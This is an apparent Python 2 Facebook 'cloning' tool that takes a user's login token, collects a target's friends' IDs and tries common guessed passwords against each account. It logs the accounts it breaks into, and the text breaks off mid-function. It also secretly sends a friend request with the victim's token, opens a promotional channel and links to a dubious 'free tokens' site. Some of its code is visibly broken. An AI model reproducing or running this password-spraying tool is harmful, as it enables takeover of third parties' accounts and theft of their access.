# created   by. lo737
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


B = '\x1b[1;96m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'
R = '\x1b[1;94m'
logo = '\n\x1b[1;96m\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x88\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x96\x84\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x96\x90\xe2\x96\x90\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x90\xe2\x96\x8c\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x90\xe2\x96\x80\xe2\x96\x90\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\xe2\x96\x90\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\n===============================\n\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print '\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x88\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x90\xe2\x96\x84\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x96\x90\xe2\x96\x90\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x90\xe2\x96\x8c\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x90\xe2\x96\x80\xe2\x96\x90\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\xe2\x96\x90\xe2\x96\x92\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x90\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x8c\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\n\n===============================\n\n'
CorrectUsername = 'hacker'
CorrectPassword = 'lo737'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\x1b[1;97mTool Username \x1b[1;97m------- \x1b[1;97m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;97m')
        if password == CorrectPassword:
            print 'Logged in successfully as ' + username
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;91mWrong Password'
        
    else:
        print '\x1b[1;94mWrong Username'
        

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo
    print '1.\x1b[1;97mLogin  Facebook  '
    time.sleep(0.05)
    print '2.\x1b[1;97mFree Acces Tokens Are Here '
    time.sleep(0.05)
    print '3.\x1b[1;97mLogin Using Token'
    time.sleep(0.05)
    print '0.\x1b[1;97mExit           '
    pilih_login()


def pilih_login():
    peak = raw_input('\n\x1b[1;97mChoose an Option>>> \x1b[1;97m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_login()
    elif peak == '1':
        login1()
    elif peak == '2':
        os.system('xdg-open https://freetokenz92737299201999936dheuiwwueieoak8jrbdhdkaiw.zyrosite.com/')
        login()
    elif peak == '3':
        tokenz()
    elif peak == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] Wrong input'
        keluar()


def login1():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        time.sleep(0.05)
        print logo13
        jalan('  \x1b[1;97mNote Do Not Use Your Personal Account')
        jalan(' \x1b[1;97mCreate New Account For Login Safely')
        print '\x1b[1;97mNew Commands Use It For Cloning'
        print '\t'
        id = raw_input('\x1b[1;97mFacebook Email/Pass : \x1b[1;97m')
        pwd = raw_input('\x1b[1;97mPassword  \x1b[1;97m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91mThere is no internet connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                unikers = open('login.txt', 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;91mLogin Successfully'
                os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;97mThere is no internet connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;97mYour Account is on Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;97mPassword/Email is wrong'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        o = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(o.text)
        nama = a['name']
        id = a['id']
        t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(t.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print '\x1b[1;97mYour Account is on Checkpoint'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97mThere is no internet connection'
        keluar()

    os.system('clear')
    time.sleep(0.05)
    print logo
    print '\x1b[1;97mLogged in User Info'
    time.sleep(0.05)
    print '\t  \x1b[1;97m Name\x1b[1;97m:\x1b[1;97m' + nama + '\x1b[1;97m               '
    time.sleep(0.05)
    print '\t   ID\x1b[1;97m:\x1b[1;97m' + id + '\x1b[1;97m              '
    time.sleep(0.05)
    print '033[1;97m==========================\x1b[1;97m'
    time.sleep(0.05)
    print '1 .\x1b[1;97m\x1b[1;97mStart Cloning   '
    time.sleep(0.05)
    print '2 .\x1b[1;97m\x1b[1;97mStart Target Hacking        '
    time.sleep(0.05)
    print '0 .\x1b[1;97m\x1b[1;97mLogout                         '
    pilih()


def pilih():
    unikers = raw_input('\n\x1b[1;97mChoose Option --- \x1b[1;97m')
    if unikers == '':
        print '\x1b[1;91mFill in correctly'
        pilih()
    elif unikers == '1':
        crack()
    elif unikers == '2':
        os.system('clear')
        print logo
        brute()
    elif unikers == '0':
        jalan('Token Removed')
        print logo
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;91mFill in correctly'
        pilih()


def crack():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '1 .\x1b[1;97mStart Cloning    '
    time.sleep(0.05)
    print '0. \x1b[1;97mBack'
    pilih_crack()


def pilih_crack():
    global cekpoint
    global oks
    peak = raw_input('\n\x1b[1;97mChoose an Option>>> \x1b[1;95m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_crack()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jjt = raw_input('\x1b[1;97mEnter ID : \x1b[1;97m')
            print '\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x96\xba\xe2\x96\xb8\xe2\x96\xb9\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x96\xb8\xe2\x96\xb9\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85\xe2\x97\x83\xe2\x97\x84\xe2\x97\x85'
            try:
                m = requests.get('https://graph.facebook.com/' + jjt + '?access_token=' + toket)
                td = json.loads(m.text)
                print '\x1b[1;97mName\x1b[1;97m:\x1b[1;97m ' + td['name']
            except KeyError:
                print '\x1b[1;91mID Not Found!'
                raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
                crack()

            print '\x1b[1;97mGetting IDs\x1b[1;97m...'
            n = requests.get('https://graph.facebook.com/' + jjt + '/friends?access_token=' + toket)
            d = json.loads(n.text)
            for c in d['data']:
                id.append(c['id'])

        elif peak == '0':
            men()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_crack()
        print '\x1b[1;97mTotal IDs\x1b[1;97m: \x1b[1;97m' + str(len(id))
        jalan('\x1b[1;97mPlease Wait\x1b[1;97m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97mCloning\x1b[1;97m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print 'To Stop Process Press CTRL then Z'
    print '-------------------------------------------------------------------'
    jalan(' \x1b[1;97mPlz Wait Cloned Accounts Will Appear Here')
    jalan(' \x1b[1;97m      Started Cloning Wait A while \xe2\x98\x95 ')
    print '\x1b[1;97m----------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('cookie')
        except OSError:
            pass

        try:
            k = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            y = json.loads(k.text)
            pass1 = '786786'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            s = json.load(data)
            if 'access_token' in s:
                print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
                oks.append(user + pass1)
            elif 'www.facebook.com' in s['error_msg']:
                print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass1
                cek = open('out/checkpoint.txt', 'k')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = 'Pakistan'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                s = json.load(data)
                if 'access_token' in s:
                    print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
                    oks.append(user + pass2)
                elif 'www.facebook.com' in s['error_msg']:
                    print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass2
                    cek = open('out/checkpoint.txt', 'k')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = y['first_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    s = json.load(data)
                    if 'access_token' in s:
                        print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in s['error_msg']:
                        print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass3
                        cek = open('out/checkpoint.txt', 'k')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass3)
                    else:
                        pass4 = y['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        s = json.load(data)
                        if 'access_token' in s:
                            print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m' + pass4
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in s['error_msg']:
                            print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass4
                            cek = open('out/checkpoint.txt', 'k')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = y['first_name'] + '12'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            s = json.load(data)
                            if 'access_token' in s:
                                print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in s['error_msg']:
                                print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass5
                                cek = open('out/checkpoint.txt', 'k')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = y['first_name'] + '786'
